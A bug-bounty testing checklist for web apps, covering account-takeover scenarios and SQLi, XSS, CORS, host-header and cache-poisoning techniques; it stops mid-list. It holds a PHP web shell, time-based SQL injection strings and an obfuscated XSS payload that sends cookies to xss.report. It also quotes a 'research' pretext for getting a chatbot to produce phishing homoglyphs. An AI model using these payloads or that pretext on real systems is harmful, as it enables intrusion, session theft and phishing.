# Bug Bounty Checklist

## Table of Contents

- [1. Functionality Testing](#1-functionality-testing)
  - [OAuth](#oauth)
  - [File Upload](#file-upload)
  - [OTP System](#otp-system-rate-limit-bypass-on-send-otp)
  - [Email Verification](#email-verification)
  - [Sign-up Form Testing](#sign-up-form-testing)
  - [2FA Misconfiguration](#2fa-misconfiguration)
  - [Authentication Testing](#authentication-testing)
  - [Password Reset Testing](#password-reset-testing)
  - [Session Issue](#session-issue-if-not-oos)
  - [Product Purchase Testing](#product-purchase-testing)
- [2. Vulnerability Testing](#2-vulnerability-testing)
  - [SQLI](#sqli)
  - [HTMLI](#htmli)
  - [XSS](#xss)
  - [Postmessage XSS](#postmessage-xss)
  - [CSRF](#csrf)
  - [CORS](#cors)
  - [Firebase Test](#firebase-test)
  - [Clickjacking](#clickjacking)
  - [IIS Window Server](#iis-window-server)
  - [Host Header Inject](#host-header-inject)
  - [IDN Homograph Attack](#idn-homograph-attack)
  - [Web Cache Vulnerabilities](#web-cache-vulnerabilities)
  - [Learning About Cache Vulnerability](#learning-about-cache-vulnerability)
  - [GraphQL Methodology-1](#graphql-methodology-1)
  - [Search Github Repo With Gitleaks](#search-github-repo-with-gitleaks)
  - [HTML Injection](#html-injection)
  - [Open Redirect](#open-redirect)
  - [Topic for Later](#topic-for-later)
  - [Low Hanging Fruit](#low-hanging-fruit)
- [3. Recon and Android Methodology](#3-recon-and-android-methodology)
  - [3.1 Recon Methodology](#31-recon-methodology)
    - [0. Basic Overview](#0-basic-overview)
    - [1. Sub Domain Enumeration](#1-sub-domain-enumeration)
    - [2. Search Engines](#2-search-engines)
    - [3. Tools List](#3-tools-list)
    - [How To Use SecLists](#how-to-use-seclists-for-bug-bounty-what-to-use-when-to-use-and-exact-commands)
  - [3.2 Android Bug Bounty](#32-android-bug-bounty)
    - [Workflow](#workflow)
    - [Hardcoded Credentials](#hardcoded-credentials)
    - [Insecure Logging](#insecure-logging)
    - [Checklist for exported=true Components](#checklist-for-exportedtrue-components)

---
## 1. Functionality Testing

---

### OAuth

- **1st Scenario**

  Reference: <https://hackerone.com/reports/1074047>

  ```text
  1. Attacker signs up on website using the victim's email (which is not registered yet).
  2. Attacker sets a password and waits.
  3. Later, the victim tries to sign up using OAuth (Google, MSN, etc.).
  4. Website allows the victim to log in via OAuth but does not check if
     the account was already created with a password.
  5. Since OAuth skips email verification, the attacker can now log in
     using the password they set earlier.
  ```

- **2nd Scenario**

  Reference:
  - <https://www.youtube.com/watch?v=GfIC_qiZb-E>
  - <https://medium.com/@ProwlSec/the-oauth-oversight-when-configuration-errors-turn-into-account-hijacks-5ed1f9c83d16>

  Note: when there is no signup verification and there is option to add oauth.

  ```text
  1. Log in using the attacker's email via OAuth/register page.
  2. Change the attacker's email to the victim's email.
  3. The victim attempts to register or reset their password.
  4. The attacker can still access the victim's account using OAuth with the attacker's email.
  ```

- **Exploiting callback_urls= parameter**

  Reference: [Account Takeover via Google OAuth Misconfiguration](https://www.linkedin.com/pulse/account-takeover-via-google-oauth-misconfiguration-izyits-e76ef/?trackingId=8AI%2FWBa3TECMDxldWaTWSw%3D%3D)

  ```text
  1. Attacker signs into their own Google account.
  2. Attacker finds the OAuth login URL used by the target (e.g., redirect_uri=...).
  3. Attacker discovers the `redirect_uri` is vulnerable to open redirect (e.g., /redirect?next=...).
  4. Attacker crafts an OAuth URL using the open redirect to point to their own domain:
     https://accounts.google.com/o/oauth2/auth?...&redirect_uri=https://target.com/redirect?next=https://attacker.com/callback
  5. Attacker opens this URL while being logged in to their Google account.
  6. The target website completes the OAuth flow and links the attacker's Google account
     to the victim's session (if the victim is logged in or session is hijacked).
  7. Now, attacker can log in anytime via Google OAuth and access the victim's account.
  ```

---

### File Upload

1. **Try adding magic bytes**

   Eg: <https://www.youtube.com/watch?v=oUI38IEqimM>

2. **Unrestricted File Upload via Double Extension Bypass**

   ```text
   The application validates uploads using only the file extension
   (e.g., .jpg, .png). Uploading a file like shell.php.png bypasses
   this check. The server treats it as a valid image but stores it with
   its original name, enabling code execution if accessed directly.

   1. Create a PHP web shell (e.g., <?php system($_GET['cmd']); ?>) and save it as shell.php.png.
   2. Upload this file via the image upload feature.
   3. Visit the uploaded file's URL.
   4. If executed as PHP, append ?cmd=whoami to test RCE.
   ```

3. **Unauthenticated Image Upload to Public Cloud Storage**

   ```text
   Description:
   Upload API accepts file uploads without requiring authentication headers
   (e.g., session tokens). The file is stored in a cloud bucket and returns a
   public URL.

   Steps to Reproduce:
   1. Intercept the upload request using Burp Suite.
   2. Remove all authentication headers (like Cookie, Authorization).
   3. Forward the request with the image file.
   4. Observe if the server returns a valid public URL.
   5. Open that URL in an incognito window to verify public access.
   ```

4. **Bypass of Product Image Upload Limit**

   ```text
   Description:
   The frontend restricts users to 7 images per product. However, this is
   enforced only via JavaScript, not server-side.

   Steps to Reproduce:
   1. Begin uploading 7 images via the UI.
   2. Intercept the final image upload request in Burp.
   3. Clone and modify the intercepted request to upload additional images (8th, 9th, etc.).
   4. Send the requests.
   5. Confirm by viewing the product page showing more than 7 images.
   ```

5. **No Rate Limiting or Upload Quotas**

   ```text
   Description:
   There's no limit to how many files can be uploaded in a short time.
   This allows abuse via automated tools.

   Steps to Reproduce:
   1. Set up Burp Suite Intruder or a script using curl/python to
      send multiple upload requests.
   2. Launch a burst of 100+ file uploads in rapid succession.

   Observe:
   - No captcha or delay.
   - Server accepts all requests.
   - All files are successfully stored.
   ```

6. **File Replacement Attack**

   ```text
   Some platforms let users replace existing files. If predictable URLs
   or file IDs are used, you might overwrite other users' files.

   1. Upload a file and observe its storage URL or ID.
   2. Try uploading a new file with same ID or URL path via Burp.
   3. If the existing file is replaced without ownership check, report it.
   ```

7. **Make a html file with xss payload change extension from html to png upload it and then change the extension again from png to html in burpsuite.**

---

### OTP System [rate limit bypass on send otp]

- **Let the intruder run till correct OTP even if there is 401 or 429 status code**

  Reference: [The $2,200 ATO Most Bug Hunters Overlooked By Closing Intruder Too Soon](https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732)

- **Generate two OTP - one from victim account second is attacker account**

  Reference: [Bypassing OTP Verification - Another Bug Found Without Any Tools](https://strangerwhite.medium.com/bypassing-otp-verification-another-bug-found-without-any-tools-8b2c1013c3e7)

- **Keep adding zero or country code before actual phone number eg**

  ```text
  0XXXXXXXXXX,
  00XXXXXXXXXX,
  000XXXXXXXXXX,
  +91XXXXXXXXXX
  ```

- **If OTP is being sent via email, try:**

  1. **`+` aliasing in Gmail**

     Eg: `raunaksteaching+1@gmail.com`, `raunaksteaching+otp@gmail.com`

  2. **`.` (dot) variation in Gmail**

     Eg: `raunak.steaching@gmail.com`, `raunakstea.ching@gmail.com`

  3. **Case variation (some apps treat as new)**

     Eg: `RaunakSteaching@gmail.com`, `RAUNAKSTEACHING@gmail.com`

  4. **Domain variation (Gmail = googlemail.com)**

     Eg: `raunaksteaching@googlemail.com`

  5. **Email parameter tampering**

     Eg: Add junk fields:

     ```json
     {"to":"raunaksteaching@gmail.com", "extra":"test"}
     ```

  6. **Use intruder with same email as multiple payload position**

- **If OTP in json format try make it array**
- **Response manipulation / false to true / correct OTP response.**
- **Check developer tools**

---

### Email Verification

- **After Creating account change email to victim mail in settings**

  Reference: [Email Verification Bypass: How I Verified Any Email](https://medium.com/@ankitrathva/email-verification-bypass-how-i-verified-any-email-470cec0dbca5)

- **Try Host header injection in email verification request**

  Reference: [How I Bypassed Account Verification With A Simple Host Header Trick](https://infosecwriteups.com/how-i-bypassed-account-verification-with-a-simple-host-header-trick-728368ae877b)

- **Parameter Pollution**

  Eg: <https://www.linkedin.com/feed/update/urn:li:activity:7299260730627756032/>

  ```text
  0. https://hackerone.com/reports/1050244
  1. Log in with a user account that is part of a group with 2FA enforced.
  2. Observe that access is blocked with a message stating that 2FA is required but not configured.
  3. While this session is active, open a new session (browser/tab/incognito) and log in with the same credentials.
  4. In the second session, replace the session token (e.g., oc_sessionPassphrase) with the one from the first session using browser dev tools.
  5. Refresh the page.
  6. If access is granted without completing or setting up 2FA, then the enforcement is bypassed.
  ```

  ```text
  0. https://hackerone.com/reports/1636552
  1. Go to https://www.khanacademy.org/signup and sign up as a learner with a date of birth below 13 years.
  2. Enter the victim's email (e.g., info@khanacademy.org) as the parent's email and click on Sign Up.
  3. You will see the message: "Your parent or guardian must approve your account or it will be deleted in 7 days."
  4. Go to https://www.khanacademy.org/settings/account and change the email to a temporary email you have access to.
  5. A verification email will be sent to the temporary email. Do not click on the verification link.
  6. Now go back to account settings and change the email again to the victim's email (e.g., info@khanacademy.org).
  ```

---

### Sign-up Form Testing

- Try to register with company mail (if there is no email verification)
- If any data is reflecting in email then try htmli

  ```html
  <!-- tracking link through htmli -->
  <img src="https://iplogger.co/142yV4" width="1" height="1" style="display:none;" />
  ```

- Try `id@<burp collaborator>` in registration page

  Reference: [How I Found My First High Severity Bug And Got Rewarded With 3 Trays of Red Bull](https://medium.com/@iski/how-i-found-my-first-high-severity-bug-and-got-rewarded-with-3-trays-of-red-bull-29ec0ca6a2e4)

- If JSON request, add comma `{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}`

---

### 2FA Misconfiguration

- **With null or 000000**
- **2FA Code Reusability**
- **2FA Bypass through Oauth**
- **Lack of Brute-Force Protection**
- **2FA Code Leakage in Response**
- **Missing 2FA Code Integrity Validation**
- **Response Manipulation / Status Code Manipulation**

  ```text
  Reference: https://likithteki.medium.com/how-i-got-150-on-hackerone-for-my-first-bug-8af0ed515e79
  1. Enable 2FA: Set up 2FA on the account and generate recovery codes.
  2. Save Codes: Securely store these recovery codes.
  3. Disable 2FA: Disable / turn off 2FA.
  4. Re-enable 2FA: Reactivate 2FA on the account.
  5. Sign Out: Log out of the account.
  6. Login Attempt: Try logging back in using one of the old recovery codes.
  7. Despite re-enabling 2FA, the old recovery codes still worked, making it easy for an attacker to bypass the security measure.
  ```

- **2FA bypass with password reset functionality.**

  Reference: <https://www.linkedin.com/posts/alsanosi_bugbounty-hackerone-bugcrowd-activity-7313613977844908033-VBFJ?utm_source=share&utm_medium=member_desktop&rcm=ACoAAD7i-kYBPFLRnBLZy31myo6GBKvOJ3sZqKI>

  ```text
  0. https://hackerone.com/reports/897385
  1. Log in to the target application and enable 2FA in the account settings.
  2. Log out, then log back in — confirm that the OTP is required after password.
  3. Use an intercepting proxy (e.g., Burp Suite) to capture the login request after submitting an incorrect OTP.
  4. Do not forward the request immediately.
  5. In the intercepted request, remove the OTP field (or leave it blank).
  6. Forward the modified request to the server.
  7. If login is successful without providing a valid OTP, 2FA is bypassed.
  ```

---

### Authentication Testing

- Try to understand which request is generating auth cookie and remove each header one by one
- Update information in profile section and try CSRF on it.

---

### Password Reset Testing

- **1st scenario**

  ```text
  1. Register with the email "testbug@gmail.com" on the website.
  2. Request a "password reset" for "testbug@gmail.com".
  3. Do "not" open the reset link you receive in your email.
  4. Log in to the account with the original password.
  5. Go to the "profile settings" and change the email from "testbug@gmail.com"
     to "victim@gmail.com".
  6. Open the "previous reset link" (received for "testbug@gmail.com").
  7. If the reset link is still "working", it means the application does not
     invalidate the reset link after the email change.
  ```

- **2nd scenario**

  ```text
  0. Password Reset Token Leakage via Host Header Poisoning
     (add X-FORWADED-HOST: <burp collaborator link> to get token)
  1. Go to the "password reset page" on the website,
     for example: "https://targetsite.com/password-reset".
  2. Enter your email (e.g., "testuser@example.com") and request a
     "password reset".
  3. The application will send a password reset email with a reset token URL,
     typically like: "https://targetsite.com/reset-password?token=<token>"
  4. "Intercept the request" for the password reset in a proxy like Burp Suite
     (or use a browser's developer tools).
  5. "Modify the Host header" in the request to a different value, such as:
     "Host: evil.com"
  6. "Forward the modified request" to the server.
  7. Observe the response from the server.
  8. If the server "leaks the reset token" or responds with any sensitive
     data related to the password reset process in response to the "poisoned
     Host header", this is a "Password Reset Token Leakage vulnerability".
  ```

- **3rd scenario**

  ```text
  0. https://hackerone.com/reports/772886
  1. Register with the email 'testuser@example.com' on the website.
  2. Go to the "password reset page" and request a reset for 'testuser@example.com'.
  3. You will receive a password reset email with a link like:
     'https://targetsite.com/reset-password?token=<reset_token>'.
  4. Open the "reset link" and change the password.
  5. Open a "new tab" in the browser and visit the same reset link:
     'https://targetsite.com/reset-password?token=<reset_token>'.
  6. If the link "still works" and you are able to successfully
     change the password again, this is a vulnerability — the reset token
     is not invalidated after use.
  ```

- **4th scenario**

  ```text
  when you need to put otp to reset password
  1. Go to the password reset page and enter the victim's mobile number.
  2. Enter any random OTP and capture the password reset request.
  3. Log in to the application using an attacker-controlled account
     (the app allows self-signup).
  4. In the captured password reset request, replace the `Authorization: Bearer`
     token with the token from the attacker's session.
  5. Modify the OTP value in the request. The application does not return a
     signature verification error, indicating that the attacker's token can be
     used to brute force OTPs for any user.
  6. Send the request to Burp Intruder, configure the attack, and brute
     force the OTP.
  7. Once a valid OTP is found, the attacker can reset the victim's password.
  ```

- **In forgot password page try to enter userid, uuid or any kind of id instead of email**

  Eg: <https://www.linkedin.com/posts/mohamedyasser44_bugbounty-cybersecurity-ethicalhacking-ugcPost-7340820921500196865-PsP7?utm_source=share&utm_medium=member_desktop&rcm=ACoAAD7i-kYBPFLRnBLZy31myo6GBKvOJ3sZqKI>

- **While setting new password on password reset page try to set token as null**

  Reference: <https://www.youtube.com/watch?v=xb4klJDM2l0>

- **After setting new password if there is a parameter with email try to make it array like in this writeup**

  Reference: [Simple Account Takeover](https://medium.com/@foxyeye/simple-account-takeover-cddecf0f551a)

- **CWE-620: Unverified Password Change.**

  Reference: [Cloudflare Bug Bounty First Old Password Does Not Expire After Password Change](https://medium.com/@iambuvanesh/cloudflare-bug-bounty-first-old-password-does-not-expire-after-password-change-b767a050d231)

- **Learn More Techniques from this articles**

  Reference: [Hubspot Full Account Takeover in Bug Bounty](https://infosecwriteups.com/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5)

- **On Password update section in profile try to do race condition**

  Reference: [Race Condition Leads to 0-Click Admin Account Takeover](https://medium.com/@ankitrathva/race-condition-leads-to-0-click-admin-account-takeover-6510f1914933)

- **Check if backend check email case sensitivity**
- **Append second email parameter and value**
- **CSRF on update password**
- **Check if forget password reset link/code uniqueness**
- **Password reset link not expiring using same link for multiple password reset**
- **Try to add comma[,] or try to make array or email in password reset page**

---

### Session Issue [If not OOS]

**1st Scenario**

```text
0. https://hackerone.com/reports/1162443
1. Go to https://exchangemarketplace.com/ and click on Sign In
2. Continue with Google Account
3. Use "EditThisCookie" Extension to export the cookies
4. Once you logged in - click on "EditThisCookie" Extension and export the cookies
5. Now open another browser and import those cookies - you can able to login an account by using cookies
6. Logout from your first browser - it should logout from another browser as well.
7. Now, login again with your google account - This time use old cookies.
8. By using old cookies, you can able to login victim's account. (Whenever victim's session is active)
```

**2nd scenario**

```text
1. Go to `https://targetsite.com` and log in with valid credentials.
2. Open "EditThisCookie" extension and export the current session cookies.
3. Open another browser (or incognito window) and import the same cookies using "EditThisCookie".
4. Confirm you are logged into the same account in both sessions.
5. In the original browser, go to account settings and "change the password".
6. Observe: the second session (imported one) is "still active" and can perform authenticated actions.
7. This confirms that "session was not invalidated" after the password change.
8. Impact: An attacker with a stolen session cookie can maintain access even after a password reset.
```

**3rd scenario**

```text
1. Login to your account on "https://targetsite.com".
2. Go to the "Profile" section and update any field (e.g., name or bio).
3. Intercept the "update request" using Burp Suite.
4. "Send the intercepted request to Repeater" (do not send it yet).
5. Now, "logout" from the application.
6. Go back to "Repeater" and "send the saved update request".
7. Login again and check the profile data.
8. If the "update was successful after logout", the session is still valid — "vulnerability confirmed".
```

Reference: <https://www.linkedin.com/posts/rohith-s-0b9b2b267_bugbounty-bugbountyreports-bugbountyjourney-activity-7318306351510683648-7Qug?utm_source=share&utm_medium=member_desktop&rcm=ACoAAD7i-kYBPFLRnBLZy31myo6GBKvOJ3sZqKI>

---

### Product Purchase Testing

- **Buy Now**
  - Tamper product ID to purchase other high valued product with low prize
  - Tamper product data in order to increase the number of product with the same prize
- **Gift/Voucher**
  - Tamper gift/voucher count in the request (if any) to increase/decrease the number of vouchers/gifts to be used
  - Tamper gift/voucher value to increase/decrease the value of the voucher in terms of money. (e.g. $100 is given as a voucher, tamper value to increase, decrease money)
  - Reuse gift/voucher by using old gift values in parameter tampering
  - Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher code
  - Use parameter pollution technique to add the same voucher twice by adding same parameter name and value again with & in the BurpSuite request
- **Add/Delete Product from Cart**
  - Tamper user id to delete products from other user's cart
  - Tamper cart id to add/delete products from other user's cart
  - Identify cart id/user id for cart feature to view the added items from other user's account
- **Place Order**
  - Tamper payment options parameter to change the payment method. E.g. Consider some items cannot be ordered for cash on delivery but tampering request parameters from debit/credit/PayPal/net banking option to cash on delivery may allow you to place order for that particular item
  - Tamper the amount value for payment manipulation in each main and sub requests and responses
  - Check if CVV is going in cleartext or not
  - Check if the application itself processes your card details and then performs a transaction or it calls any third-party payment processing company to perform a transaction
- **Track Order**
  - Track other user's order by guessing order tracking number
  - Brute force tracking number prefix or suffix to track mass orders for other users
- **Wish list page testing**
  - Check if a user A can add/remove products in Wishlist of other user B's account
  - Check if a user A can add products into user B's cart from his/her (user A's) Wishlist section.
- **Post product purchase testing**
  - Check if user A can cancel orders for user B's purchase
  - Check if user A can view/check orders already placed by user B
  - Check if user A can modify the shipping address of placed order by user B
- **Out of band testing**
  - Can user order product which is out of stock?

---

#### CSRF

**Unauthorized Addition of Shipping Addresses and Shopping Carts via CSRF**

[Bug Bounty Findings: Unauthorized Addition of Shipping Addresses and Shopping Carts via CSRF](https://medium.com/bugbountywriteup/bug-bounty-findings-unauthorized-addition-of-shipping-addresses-and-shopping-carts-via-csrf-f62d88071dd6)

---

## 2. Vulnerability Testing

---

### SQLI

#### Test Cases

Based on: [How I Got Time-Based SQL Injection in an Old Public Bug Bounty Program](https://medium.com/@kshunya/how-i-got-time-based-sql-injection-in-an-old-public-bug-bounty-program-f6260cd4e75e)

- Check parameters like **user ID**
- Inject both **single `'` and double `"` quotes** in all parameters
- **Any parameter** could be vulnerable — test all
- Try **URL encoding** of payloads
- Test with payloads in the **User-Agent** header

#### Payloads to Try

- **Time-Based SQLi**

  ```sql
  -- https://tib3rius.com/sqli.html
  (select*(from(select(sleep(5)))a)
  XOR(if(now()=sysdate(),sleep(5),0))XOR
  bug4y0u'|(IF((now())LIKE(sysdate()),SLEEP(6),0))|'bug4y0u
  'XOR(if(now()=sysdate(),(sleep((((10))))),0))XOR'X
  'XOR(if(now()=sysdate(),sleep(8),0))XOR'111
  bug4y0u'+AND+/**/(%53ELEcT+1+/**/+fRoM/**/+(SE%4cEC%54(sL%45%45P(3%29%29%29a)+A%4ed+'bug4y0u'%3d'bug4y0u
  (select sleep(4))
  '; waitfor delay '0:0:6' --
  ';%20waitfor%20delay%20'0:0:7'%20--%2014:40
  id%2c(select*from(select(sleep(10)))a)
  '||(SELECT+pg_read_file('filepath'))||'
  ```

- **Error-Based SQLi**

  ```sql
  ' || (select '') || '            -- MySQL / MSSQL
  ' || (select '' from dual) || '  -- Oracle
  ```

- **Tool Commands**

  Reference: [Exploring a New SQLi Vulnerability: A Ghauri Experience](https://medium.com/meetcyber/exploring-a-new-sqli-vulnerability-a-ghauri-experience-541c588dc00d)

  - **Ghauri**

    ```bash
    ghauri -r burp --batch --batch -p email --dbs
    ghauri -r burp.txt --batch -p usr,pwd --dbs
    ghauri -r burp.txt --batch -p user_id,password --dbs --technique=BEUT

    ghauri -r burp -p user --technique=BEUSTQ --level=5 --risk=3 \
      --current-db --banner --random-agent --is-dba --dbs --hostname \
      --current-user --time-sec=10 --delay=1 --threads=3
    ```

  - **SQLMap**

    ```bash
    sqlmap -r burp -p user --level=3 --risk=3 --current-db --banner --random-agent
    ```

---

### HTMLI

```text
Reference: https://www.linkedin.com/posts/vikas-gupta63_bugbounty-bugbounty-cybersecurity-activity-7363461995787898882-BsDf?utm_source=share&utm_medium=member_desktop&rcm=ACoAAD7i-kYBPFLRnBLZy31myo6GBKvOJ3sZqKI
Normal :- <a href="bugcrowd.com">p</a>
Bypass ==> ">Contact us Immediately?<><a href="https://bugcrowd.com>"3eddd3e/a>
```

---

### XSS

Reference: [How 100% Manual Hacking Without Even Kali and Burp Led to 2 Medium Vulnerabilities on YesWeHack](https://medium.com/@manan_sanghvi/how-100-manual-hacking-without-even-kali-and-burp-led-to-2-medium-vulnerabilities-on-yeswehack-bbda00fcd84e)

```html
First try abc'">><>#;--
abc'"><><img src=1 onerror=alert(document.cookie)>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2d1cjkxNj9kb2N1bWVudC5jb29raWUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

---

### Postmessage XSS

Reference: <https://chatgpt.com/c/692fbdbd-cc1c-8324-93af-405f3e50ab68>

#### Writeup

```text
Methodology
https://github.com/yavolo/eventlistener-xss-recon?tab=readme-ov-file#exploitation
https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd

Best YT Video on this topic
https://www.youtube.com/watch?v=FTeE3OrTNoA

https://jlajara.gitlab.io/Dom_XSS_PostMessage
https://jlajara.gitlab.io/Dom_XSS_PostMessage_2
https://payatu.com/blog/postmessage-vulnerabilities/
https://www.youtube.com/watch?v=FTeE3OrTNoA
https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerablities?utm_source=chatgpt.com
https://trustfoundry.net/2024/07/30/a-quick-introduction-to-postmessage-xss/?utm_source=chatgpt.com
```

#### Tools

- <https://portswigger.net/burp/documentation/desktop/tools/dom-invader>
- <https://blog.ostorlab.co/postmessage-xss-proxy-object-instrumentation.html?utm_source=chatgpt.com>

---

### CSRF

- CSRF in Oauth connect

---

### CORS

#### Resources

- [How I Earned in a CORS Exploit Misconfigured](https://medium.com/@iambuvanesh/how-i-earned-in-a-cors-exploit-misconfigured-1ff736e75314)
- [CORS POC Generator](https://vral-parmar.github.io/CORS-POC-Generator/)

```bash
python3 corsy.py -u https://example.com
curl -I -H "Origin: https://evil.com" https://www.target.com/user/profile

# And the response I got back:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

---

### Firebase Test

Reference: [Testing Firebase API Key Vulnerabilities: A Step-by-Step Guide](https://medium.com/@ranjankr/testing-firebase-api-key-vulnerabilities-a-step-by-step-guide-3e265e673a69)

---

### Clickjacking

#### Where Clickjacking actually matters

```text
1. Account Settings (email, password, phone update)
2. Two-Factor Authentication (2FA) Settings
3. Account Deletion / Deactivation Pages
4. Payment Pages (e.g., add/change payment method)
5. Bank Transfer or Fund Withdrawal
6. Subscription Upgrade / Downgrade
7. Permission Grant Pages (OAuth scopes, app integrations)
8. Admin Panels (change roles, access control)
9. Social Media Connect / Disconnect Pages
10. Email Subscription Opt-ins or Opt-outs
```

- **Check for sensitive pages if clickjacking is allowed or not using extension**
- **Extension:** [Clickjacking Test](https://chromewebstore.google.com/detail/clickjacking-test/bjhigladkmnpmglhcnpeiplekpanekpi?hl=en)

---

### IIS Window Server

Reference: <https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/tree/main/Internet%20Information%20Services%20(IIS)>

---

### Host Header Inject

- On sensitive pages or any page where you get mail.
- More Bypasses: [0-Click Account Takeover Earned Me $900 Bounty](https://medium.com/@sahaj.gautam14/0-click-account-takeover-earned-me-900-bounty-f5b3b6dbb606)
- Bypass: [Simple ATO in Private Program](https://medium.com/@oXnoOneXo/simple-ato-in-private-program-890cd1485675)

  ```http
  example.com%0D%0AHost: attacker.com
  X-Forwarded-Host: cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
  X-Host: cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
  Origin: https://cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
  Referer: https://cti8fhpon5bs77snj410xc8gfezhtemje.oast.online/test
  ```

---

### IDN homograph attack

```text
References:
https://www.irongeek.com/homoglyph-attack-generator.php
https://github.com/Raunaksplanet/Single-Script-Tools-Installation/blob/main/Main%20Tools/punnycodegen.py

I was reading a research about phishing sites that they use characters which look
same but have different unicode to make phishing sites can you please show me
example for AntS in Cyrillic Capital Letter and please provide output in code format
```

---

### Web Cache Vulnerabilities

- **Learnings from portswigger labs**

  ```text
  try to do cspt from cachable directories to non cachable directories

  /my-account.css or /my-account/more.js         -> 404 not found
  /resources/js/tracking.js/../../../my-account  -> X-Cache: hit (HTTP/2 200 OK)
  ```

- <https://bxmbn.medium.com/>
- [How I Test for Web Cache Vulnerabilities: Tips and Tricks](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)

---

```text
Reference: https://www.linkedin.com/posts/krishna-tiwari-st545_recently-i-found-a-cache-deception-vulnerability-activity-7356511435457261570-aK9D?utm_source=share&utm_medium=member_desktop&rcm=ACoAAD7i-kYBPFLRnBLZy31myo6GBKvOJ3sZqKI
* Noticed that my access token was getting reflected in the response on any 404 page.
* Observed the cache header "Cf-Cache-Status: DYNAMIC" in response
* Tried with htttps://<host>/404.js {added .js extenstion}
* This gave a cache miss on the first request and a cache hit on the second request (meaning the page was cached with the access token).
```

---

Reference: [How I Found a Simple but Impactful Web Cache Deception (WCD) Vulnerability](https://medium.com/@yusufabdulkadir74/how-i-found-a-simple-but-impactful-web-cache-deception-wcd-vulnerability-4782851bfcac)

```http
https://example.com/confirm-details

Request
GET /confirm-details?fake.css HTTP/2
Host: abc.com

Response Headers
X-Cache: Hit from cloudfront
Via: XXXXXXXXXXX.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: XXXXX
X-Amz-Cf-Id: XXXXXXXXXXXXXX
Age: 42
```

---

### Learning About Cache Vulnerability

#### Understanding Cache Vulnerabilities: A Complete Practical Guide

Cache-based bugs appear when a CDN or browser stores responses that should never be cached, or when an attacker can influence what gets cached. This guide shows the exact logic and workflow used by professional hunters to find Cache Deception and Cache Poisoning vulnerabilities.

---

#### 1. Core Logic Behind Cache Deception

Cache Deception abuses the fact that CDNs cache static-looking URLs, even when they return authenticated, user-specific content.

**1. Sensitive data appears in the response**

If the endpoint returns anything tied to the logged-in user, caching becomes dangerous.

**2. The response is cacheable**

Weak or missing cache-control makes private data cacheable.

**3. The request must be GET**

Only GET is cached by default.

**4. Attacker can modify the URL**

Using fake static paths (`.css`, `.js`, `.png`) to force caching.

---

#### Important Clarification: Cache Vulns Are Broader Than Cache Deception

A critical point:

**Only Cache Deception depends on sensitive user-specific data in response.**

**Cache vulnerabilities as a whole do NOT.**

Other cache bugs work even without sensitive data:

**1. Cache Poisoning → XSS**

If an attacker poisons a cached JavaScript file, every visitor gets the malicious payload.

**2. Cache Poisoning → Redirect Hijack**

Poisoning cached redirects can force all users to an attacker-controlled domain.

**3. Cache Key Confusion**

Users receive responses meant for other roles (admin-only content, elevated views).

**4. Caching of Error Responses**

Cached 301/302/500 responses break the site globally.

**5. API Logic Impact**

If dynamic API responses are cached, it can disable validation, limits, or workflow steps.

So while cache deception relies on **private data**,

**cache poisoning, key confusion, and caching logic flaws do not**.

---

#### 2. Practical Cache Deception Checklist (File Downloads)

When you see a static-looking file like `file.zip`, follow this workflow.

Reference: [I Found Cache Poisoning Earned $500 in Just a Few Minutes](https://theindiannetwork.medium.com/i-found-cache-poisoning-earned-500-in-just-a-few-minutes-78337a437d55)

**1. Check cacheability**

public, Weak or missing Cache-Control is risky.

**2. Check if CDN is active**

Look for `CF-Cache-Status`, `X-Cache`, and `Age:`.

**3. Test unkeyed headers**

Send variations that may change the response but are not part of the cache key.

**4. Check whether errors get cached**

If error responses are cached, poisoning becomes possible.

**5. Confirm poisoning**

Check MISS → HIT → increasing Age.

**6. High-risk indicators**

Cloudflare/Akamai + unsigned URLs + identical error pages = high probability of a bug.

---

#### 3. How to Test MISS → HIT

- MISS on first request
- HIT on second
- Age increasing on third
- This confirms the CDN is storing the response.
- Adding header variations that change the response and still produce HIT means the cache is poisonable.

---

#### 4. Understanding CF-Cache-Status

Useful statuses:

- **HIT**
- **MISS → HIT**
- **EXPIRED**
- **REVALIDATED**
- **STALE**

Usually not exploitable unless you force caching:

- **DYNAMIC**
- **BYPASS**

---

#### 5. Overall Logic for Cache Vulnerability Testing

1. Confirm caching exists (`HIT`, `MISS`, `Age:`).
2. Inspect origin cache-control behavior.
3. Try cache-key manipulations.
4. Look for sensitive data only if testing deception.
5. Confirm by MISS → HIT transitions.

---

### Graphql Methodology-1

- **Try this tool**

#### 1. Endpoint Discovery

- Identify GraphQL endpoint. Usually: `/graphql`, `/api/graphql`, `/graphiql`, `/playground`, etc.

#### 2. Schema Enumeration

- Use **InQL (Burp extension)** to extract the schema and introspection.
- Copy schema and feed into **GQLSpection** to generate all available queries and mutations.

**Improved step:**

- If introspection is disabled, try these:
  - `GraphQLmap --introspect`
  - Manual guessing or use wordlists: `graphql-wordlist`, `GraphQL Raider`
  - Look for hidden docs in `/graphiql` or `/docs` or browser DevTools

#### 3. Query & Mutation Analysis

- From GQLSpection output:
  - List all queries and mutations
  - Check for user-related fields, admin features, or sensitive data fetches
- Tools:
  - `GraphQL Voyager`: visualizes schema relations
  - `Postman` or `Insomnia`: helps send and test queries

#### 4. Fuzzing & Enumeration

- Use `GraphQLmap`, `InQL`, `Graphw00f`:
  - Fuzz for fields, types, enum values
  - Identify vulnerable operations
- Use wordlists to brute-force:
  - Hidden fields
  - Enum values
  - Parameters

#### 5. Broken Access Control / IDOR

- Check queries/mutations that accept IDs or user references
- Try:
  - Changing user IDs
